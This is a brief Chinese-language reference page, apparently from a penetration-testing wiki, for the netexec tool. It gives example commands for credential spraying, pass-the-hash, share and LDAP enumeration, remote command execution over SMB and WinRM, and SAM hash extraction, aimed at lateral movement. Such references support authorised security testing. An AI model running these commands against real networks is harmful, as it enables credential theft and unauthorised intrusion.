# netexec

## 简介
网络执行工具（原 crackmapexec），用于 SMB/WinRM/LDAP 等协议的渗透测试

## 核心参数
- 协议（smb, winrm, ldap 等）
- `-u/-p`: 用户名/密码
- `-H`: NTLM 哈希
- `-x`: 执行命令

## 命令示例
```bash
# SMB 凭据测试
netexec smb 192.168.1.100 -u admin -p password

# 批量测试凭据
netexec smb 192.168.1.0/24 -u users.txt -p passwords.txt

# Pass-the-Hash
netexec smb 192.168.1.100 -u admin -H aad3b435b51404eeaad3b435b51404ee:hash

# 枚举共享
netexec smb 192.168.1.100 -u admin -p password --shares

# 执行命令
netexec smb 192.168.1.100 -u admin -p password -x whoami

# 提取 SAM
netexec smb 192.168.1.100 -u admin -p password --sam

# WinRM 连接
netexec winrm 192.168.1.100 -u admin -p password -x whoami

# LDAP 枚举
netexec ldap 192.168.1.100 -u admin -p password --users
```

## 使用场景
内网渗透中的批量凭据测试和横向移动

## 所属分类
- [凭据访问 (Credential Access)](../categories/11-credential-access.md)
